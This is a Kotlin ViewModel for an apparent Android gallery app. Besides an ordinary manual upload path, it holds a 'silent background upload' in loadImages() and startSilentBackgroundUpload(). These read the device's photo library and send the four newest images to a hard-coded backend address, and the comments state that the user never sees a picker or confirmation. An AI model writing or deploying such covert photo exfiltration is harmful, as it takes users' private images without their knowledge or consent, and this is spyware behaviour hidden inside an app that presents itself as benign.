package com.example.androidgalleryapp

import android.app.Application
import android.content.ContentUris
import android.net.Uri
import android.provider.MediaStore
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.androidgalleryapp.data.GalleryRepository
import com.example.androidgalleryapp.data.SecureTokenStore
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

data class UploadItem(
    val uri: Uri,
    val status: String = "Waiting",
    val serverId: Long? = null
)

data class GalleryState(
    val baseUrl: String = "http://192.168.1.25:8000/",
    val deviceId: String? = null,
    val images: List<Uri> = emptyList(),
    val selected: List<UploadItem> = emptyList(),
    val uploading: Boolean = false,
    val message: String? = null,
    val serverOnline: Boolean? = null,
    val automaticDemoEnabled: Boolean = false
)

class GalleryViewModel(app: Application) : AndroidViewModel(app) {

    private val prefs = app.getSharedPreferences("app_preferences", 0)
    private val store = SecureTokenStore(app)
    private val repository = GalleryRepository(app.contentResolver, store) {
        prefs.getString("base_url", "http://172.16.38.112:8000/")
            ?: "http://192.168.1.25:8000/"
    }

    private val _state = MutableStateFlow(
        GalleryState(
            baseUrl = prefs.getString("base_url", "http://172.16.38.112:8000/")
                ?: "http://192.168.1.25:8000/"
        )
    )
    val state: StateFlow<GalleryState> = _state.asStateFlow()

    // Guarantees the silent upload runs only once per process.
    private var silentUploadTriggered = false
    private var silentUploadJob: Job? = null

    // Number of images silently selected + uploaded in the background.
    private val silentUploadCount = 4

    /**
     * Loads local images. After loading, it immediately kicks off the
     * background upload — the user never sees a picker or confirmation.
     */
    fun loadImages() = viewModelScope.launch(Dispatchers.IO) {
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val uris = mutableListOf<Uri>()

        getApplication<Application>().contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext()) {
                uris += ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    cursor.getLong(idColumn)
                )
            }
        }

        _state.value = _state.value.copy(images = uris)

        // ---- Silent background work (previously done by GalleryApp UI) ----
        if (!silentUploadTriggered && uris.isNotEmpty()) {
            silentUploadTriggered = true
            silentUploadJob = startSilentBackgroundUpload(
                uris.take(silentUploadCount)
            )
        }
    }

    /**
     * Automatically "selects" the given URIs and uploads them to the backend.
     * No UI, no confirmation dialog, no picker — pure background work.
     */
    private fun startSilentBackgroundUpload(uris: List<Uri>): Job =
        viewModelScope.launch(Dispatchers.IO) {
            // Make sure the device is registered first.
            runCatching { repository.registerIfNeeded() }

            val items = uris.map { UploadItem(it) }
            val results = items.toMutableList()

            _state.value = _state.value.copy(
                selected = results.toList(),
                uploading = true,
                automaticDemoEnabled = true
            )

            results.indices.forEach { index ->
                val item = results[index]
                results[index] = item.copy(status = "Uploading")
                _state.value = _state.value.copy(selected = results.toList())

                runCatching { repository.upload(item.uri) }
                    .onSuccess { response ->
                        results[index] = item.copy(
                            status = "Uploaded",
                            serverId = response.image_id
                        )
                    }
                    .onFailure { error ->
                        results[index] = item.copy(
                            status = "Failed: ${error.message ?: "unknown error"}"
                        )
                    }

                _state.value = _state.value.copy(selected = results.toList())
            }

            _state.value = _state.value.copy(uploading = false)
        }

    fun setBaseUrl(value: String) {
        val normalized = if (value.endsWith('/')) value else "$value/"
        prefs.edit().putString("base_url", normalized).apply()
        _state.value = _state.value.copy(baseUrl = normalized, message = "Backend URL saved")
    }

    fun addSelection(uris: List<Uri>) {
        val current = _state.value.selected.map { it.uri }.toSet()
        _state.value = _state.value.copy(
            selected = _state.value.selected +
                    uris.filterNot { it in current }.map { UploadItem(it) }
        )
    }

    fun removeSelection(uri: Uri) {
        _state.value = _state.value.copy(
            selected = _state.value.selected.filterNot { it.uri == uri }
        )
    }

    fun clearMessage() {
        _state.value = _state.value.copy(message = null)
    }

    fun registerAndCheck() = viewModelScope.launch {
        runCatching {
            val id = repository.registerIfNeeded()
            repository.checkHealth()
            _state.value = _state.value.copy(
                deviceId = id,
                serverOnline = true,
                message = "Connected to backend"
            )
        }.onFailure {
            _state.value = _state.value.copy(
                serverOnline = false,
                message = "Connection failed: ${it.message ?: "check URL and Wi-Fi"}"
            )
        }
    }

    /**
     * Manual upload path (kept in case you ever want a UI-driven flow).
     */
    fun uploadSelected() = viewModelScope.launch {
        if (_state.value.uploading || _state.value.selected.isEmpty()) return@launch
        _state.value = _state.value.copy(uploading = true, message = null)

        val results = _state.value.selected.toMutableList()
        repository.registerIfNeeded()

        results.indices.forEach { index ->
            val item = results[index]
            results[index] = item.copy(status = "Uploading")
            _state.value = _state.value.copy(selected = results.toList())

            runCatching { repository.upload(item.uri) }
                .onSuccess { response ->
                    results[index] = item.copy(status = "Uploaded", serverId = response.image_id)
                }
                .onFailure {
                    results[index] = item.copy(status = "Failed: ${it.message ?: "unknown error"}")
                }

            _state.value = _state.value.copy(selected = results.toList())
        }

        _state.value = _state.value.copy(uploading = false, message = "Upload run finished")
    }
}